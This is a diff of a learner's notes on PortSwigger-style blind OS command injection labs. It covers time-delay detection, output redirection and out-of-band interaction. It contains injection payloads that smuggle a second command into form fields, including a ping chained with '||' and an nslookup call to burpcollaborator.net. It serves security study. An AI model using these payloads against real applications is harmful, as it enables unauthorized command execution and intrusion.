@@ -1,5 +1,10 @@
 # Blind OS command injection vulnerabilities
-## Lab: Blind OS command injection with time delays
+
+Same like blind sql injection, blind OS command injection arises when an application is vulnerable to  OS command injection without returning the relevant result from the payload.
+
+But it's still exploitable and below is the following techniques to detect a blind OS command injection vulnerabilities:
+
+## Lab #2: Blind OS command injection with time delays
 
 Sample request
 ```
@@ -40,13 +45,13 @@ Injection on auto mailing:
 mail -s "This website is vulnerable by design" -aFrom:NotValidMail||ping -c 10 127.0.0.1|| feedback@vulnerable-website.com
 ``` 
 
-Note:
-`A ; B`, run A then run B
-`A || B`, if A failed, run B
-`A && B`, run B if a success
+Note:  
+`A ; B`, run A then run B   
+`A || B`, if A failed, run B  
+`A && B`, run B if a success  
 `A & B`, run A in background, run B in foreground
 
-## Lab: Blind OS command injection with output redirection
+## Lab #3: Blind OS command injection with output redirection
 
 Sample request:
 ```
@@ -84,3 +89,23 @@ But because the content-type is set to image/jpeg, the browser will try to rende
 We need BurpSuite to intercept the request as well as its response.
 
 ![2f66306da4784b1eb2c629ac1012d95c.png](./_resources/2f66306da4784b1eb2c629ac1012d95c.png)
+
+## Lab #4: Blind OS command injection with out-of-band interaction
+
+Note:
+If the system is asynchronous, it has no effect to the response timing. However, beside file write redirect, we could also detect the blind os command injection by redirecting the output to outer domain (out-of-band)
+
+> An out-of-band means to reflect the response of payload to public server/system that we control  
+> In short, we making it to interact with outer system that we monitored.
+
+
+Steps:
+
+Since labs only allows burp domain, and burp collaborator only available in the Pro version, I couldn't monitor the output.
+
+Payload
+```
+email=||nslookup+burpcollaborator.net||
+```
+
+![4bf806a14fe5a426441fe8d0f39f2fed.png](./_resources/6a51eeec4d6e43ce86c45adfa0274c63.png)
